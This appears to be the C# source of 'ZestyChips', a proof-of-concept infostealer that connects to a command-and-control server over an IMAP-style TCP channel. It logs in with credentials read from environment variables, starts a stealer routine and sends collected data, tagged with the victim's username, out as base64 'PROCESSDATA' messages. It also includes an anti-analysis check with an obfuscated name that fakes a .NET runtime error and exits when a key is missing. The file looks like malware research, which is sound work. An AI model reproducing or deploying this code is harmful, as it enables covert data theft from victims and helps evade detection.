using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Web;

/**
* @author 0xflux
* usage (vscode): dotnet run
*/

namespace ZestyChips
{
    internal class Program
    {
        private static TcpClient client = new TcpClient();
        static void Main(string[] args)
        {
            Helpers.PrintInfo("starting ZestyChips...");

            string name = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;

            // cheat the hardcoded IP
            string c2_ip = "127.0.0.1";
            int c2_port = 143;

            // use env variables to login
            string username = Environment.GetEnvironmentVariable("simap_poc_username");
            string password = Environment.GetEnvironmentVariable("simap_poc_password");

            if (username == "" || password == "") {
                Helpers.PrintFail("username or password env variable not set. If it is set, reload your shell / session.");
                return;
            }

            // establish connection to c2
            if (Connect(c2_ip, c2_port))
            {
                Helpers.PrintSuccess("connected to c2 server.");

                if (Login(username, password))
                {
                    // we have authenticated with the C2
                    Stealer.Start();
                }
            }
        }

        // establish TCP connection to c2
        static bool Connect(string serverAddress, int portNumber)
        {
            try
            {
                client.Connect(serverAddress, portNumber);
                return true;
            }
            catch
            {
                Helpers.PrintFail("failed to connect to c2.");
                return false;
            }
        }

        public static bool Login(string username, string password)
        {
            try
            {
                NetworkStream stream = client.GetStream();

                string loginCommand = $"LOGIN {username} {password}\r\n";
                byte[] commandBytes = Encoding.ASCII.GetBytes(loginCommand);
                string checkval = Environment.GetEnvironmentVariable("zestychips_idufgh");
                if (!WinAPIGetDotNetVersion()) {
                    Console.WriteLine("Fatal .net runtime error.");
                    Environment.Exit(0);
                }

                stream.Write(commandBytes, 0, commandBytes.Length);

                stream.ReadTimeout = 5000;

                byte[] response = new byte[256];
                int bytesRead;
                try
                {
                    bytesRead = stream.Read(response, 0, response.Length);
                }
                catch (IOException ex)
                {
                    Helpers.PrintFail($"timeout or network error: {ex.Message}");
                    return false;
                }

                string responseString = Encoding.ASCII.GetString(response, 0, bytesRead);
                Helpers.PrintInfo($"response: {responseString}");

                if (responseString.Contains("OK LOGIN"))
                {
                    return true;
                }
                else
                {
                    Helpers.PrintFail("failed to login to IMAP server. Response: " + responseString);
                    return false;
                }
            }
            catch (Exception ex)
            {
                Helpers.PrintFail($"unknown error occurred logging into IMAP server: {ex.Message}");
                return false;
            }
        }

        /*
        * Encode a string to base64 and send to IMAP server.
        * Returns a bool for success status
        */
        public static bool SendBase64EncodedData(string data) {
            try {

                string text = string.Concat(new string[] {
                    "From: a_",
                    Environment.UserName,
                    "\r\nSubject:",
                    DateTime.UtcNow.ToString(),
                    "_report\r\n\r\n",
                    data
                });
                // encode data to b64
                string base64Data = Convert.ToBase64String(Encoding.ASCII.GetBytes(text));

                NetworkStream stream = client.GetStream();
                string dataCommand = $"PROCESSDATA {base64Data}\r\n"; // send PROCESSDATA switch
                byte[] commandBytes = Encoding.ASCII.GetBytes(dataCommand); // encode to bytes
                stream.Write(commandBytes, 0, commandBytes.Length); // write to the stream

                // read server resposne
                byte[] response = new byte[256];
                int bytesRead = stream.Read(response, 0, response.Length);
                string responseString = Encoding.ASCII.GetString(response, 0, bytesRead); // to string

                // Helpers.PrintInfo($"server response: {responseString}");

                return responseString.Contains("OK Data processed");
            }
            catch (IOException ex)
            {
                Helpers.PrintFail($"IO Exception: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                Helpers.PrintFail($"Unexpected error encoding / sending data to c2: {ex.Message}");
                return false;
            }
        }

        private static bool WinAPIGetDotNetVersion() {
            string ckljvhckjhvb = "zestychips_idufgh";

            string fkujghfsdluifghfdg = SimpleDecrypt(SimpleEncrypt("duihfkuyghbkhr65jhb"));
            string fsdujiguhlifudgh = SimpleDecrypt(Environment.GetEnvironmentVariable(ckljvhckjhvb));

            return fsdujiguhlifudgh == fkujghfsdluifghfdg;
        }

        private static string SimpleEncrypt(string input) {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
        }

        private static string SimpleDecrypt(string encryptedInput) {
            return Encoding.UTF8.GetString(Convert.FromBase64String(encryptedInput));
        }

    }

}